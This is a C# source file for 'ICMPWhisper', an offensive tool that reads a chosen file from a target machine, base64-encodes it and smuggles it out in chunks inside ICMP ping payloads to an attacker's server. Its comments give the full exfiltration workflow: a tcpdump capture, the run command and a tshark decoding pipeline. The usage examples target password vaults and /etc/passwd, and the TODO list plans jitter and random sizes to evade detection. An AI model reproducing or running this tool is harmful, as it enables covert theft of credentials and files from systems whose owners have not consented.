using System;
using System.Net;
using System.Net.NetworkInformation;
using System.Text; 
using System.IO;
using System.Threading;

// ICMPWhisper - Javier Carabantes from Intense Security

// Steps are:
// On your destination server:
// sudo tcpdump -U -i wlp2s0 icmp[0] == 8 -w /tmp/test.pcap

// On targets machine:
// ICMPWhisper.exe my.dest.ip.srv C:\\file_to_exfiltrate.kdbx

// Once ICMPWhisper has finished, on your destination server
// 2 - sudo tshark -r /tmp/test.pcap -Y ip.src==127.0.0.1 -T fields -e data | xxd -p -r | base64 -d
// Note: instead of 127.0.0.1 set the target's IP address (sometimes it fails, just remove the ip.src filter)

// TODOs
// Allow Hostname as destination server, not only IP Address as first argument
// Check Admin/Sudo
// Create a Preprocessor function instead direct b64
// blockSize via parameter instead of hardcoded 1000?
// blockSize random to avoid detection?
// jitter - random sleep for each connection

// based on https://learn.microsoft.com/en-us/dotnet/api/system.net.networkinformation.ping?view=net-7.0
namespace Tools.Intense.Security.ICMPWhisper
{
    public class IcmpWhisper
    {
        private static void ShowBanner()
        {            

            Console.WriteLine(@"██╗ ██████╗███╗   ███╗██████╗ ██╗    ██╗██╗  ██╗██╗███████╗██████╗ ███████╗██████╗ ");
            Console.WriteLine(@"██║██╔════╝████╗ ████║██╔══██╗██║    ██║██║  ██║██║██╔════╝██╔══██╗██╔════╝██╔══██╗");
            Console.WriteLine(@"██║██║     ██╔████╔██║██████╔╝██║ █╗ ██║███████║██║███████╗██████╔╝█████╗  ██████╔╝");
            Console.WriteLine(@"██║██║     ██║╚██╔╝██║██╔═══╝ ██║███╗██║██╔══██║██║╚════██║██╔═══╝ ██╔══╝  ██╔══██╗");
            Console.WriteLine(@"██║╚██████╗██║ ╚═╝ ██║██║     ╚███╔███╔╝██║  ██║██║███████║██║     ███████╗██║  ██║");
            Console.WriteLine(@"╚═╝ ╚═════╝╚═╝     ╚═╝╚═╝      ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝╚══════╝╚═╝     ╚══════╝╚═╝  ╚═╝");
            Console.WriteLine("Version 1.0.0 - Javier Carabantes\n\n");

        }

        private static void ShowUsage()
        {
            Info("Usage: ICMPWhisper.exe <destination-ip> <fullpath-filename>");
            Info("Example: ICMPWhisper.exe 127.0.0.1 C:\\users\\admin\\passwords.kdbx");
            Info("Example: ICMPWhisper.exe 127.0.0.1 /etc/passwd\n");
        }

        public static string GetB64Content( string f )
        {
            byte[] data = File.ReadAllBytes(f);
            string r = Convert.ToBase64String(data);
            return r;
        }

        private static void Info(string message)
        {
            // Configuración de colores para el prefijo "[INFO]"
            Console.ForegroundColor = ConsoleColor.Green; // Color de texto verde
            Console.BackgroundColor = ConsoleColor.Black; // Fondo de la consola en negro

            Console.Write("[INFO] ");

            // Restaurar los colores originales de la consola
            Console.ResetColor();
            Console.WriteLine(message);
        }

        // args[0] must be an IPaddress not host name (ToDo)
        public static void Main (string[] args)
        {
            ShowBanner();
            if ( args.Length != 2 )
            {
                ShowUsage();
                return;
            }

            IPAddress destinationIpAddress;
            string fullFileName = args[1];
            string contentFile;
            
            // Parsing IP
            try
            {
                destinationIpAddress = IPAddress.Parse( args[0] );
            }
            catch ( FormatException )
            {
                Info("Error: IP Address has an invalid format");
                return;
            }          

            // Checking if the file to exfiltrate exists and has correct permissions
            try
            {
                
                if (System.IO.File.Exists( fullFileName ))
                {
                    Info( "File exists, trying to read the content" );
                    contentFile = GetB64Content( fullFileName );
                } else {
                    throw new System.IO.FileNotFoundException( "The file does not exist." );
                }
            }
            catch ( Exception ex )
            {
                Console.WriteLine( "Error: " + ex.Message );
                Console.WriteLine( "Possible causes: ");
                Console.WriteLine( "- The file does not exist." );
                Console.WriteLine( "- Access to the file is not authorized (insufficient permissions)." );
                Console.WriteLine( "- There was an I/O (input/output) exception while trying to read the file." );
                return;
            }

            Info( "Length is: " + contentFile.Length );

            Ping pingSender = new Ping();
            PingOptions options = new PingOptions();
            options.DontFragment = true;

            // Each packet will contain a max of 1Kb of data
            const int blockSize = 1000;
            int timeout = 120;
            int milliseconds = 500;

            if ( contentFile.Length > blockSize )
            {
                for ( int i = 0; i < contentFile.Length; i += blockSize )
                {
                    // Which one is the min
                    int remainingBytes = Math.Min( blockSize, contentFile.Length - i );

                    // fetching and sending the chunk
                    string blockToSend = contentFile.Substring( i, remainingBytes );
                    byte[] bytesToSend = Encoding.UTF8.GetBytes( blockToSend );
                    Console.Write( "[*] Sending chunk: " );
                    Thread.Sleep( milliseconds );
                    PingReply reply = pingSender.Send ( destinationIpAddress, timeout, bytesToSend, options );

                    if ( reply.Status == IPStatus.Success )
                    {
                        Console.WriteLine( "server replied" );
                    } else {
                        Console.WriteLine( "no response from server" );
                    }
                }

            } else {
                Info( "Length < 1Kb, sending the whole content" );
                byte[] bytesToSend = Encoding.ASCII.GetBytes( contentFile );
                PingReply reply = pingSender.Send ( destinationIpAddress, timeout, bytesToSend, options );
            }
            Info("Done");
        }
    }
}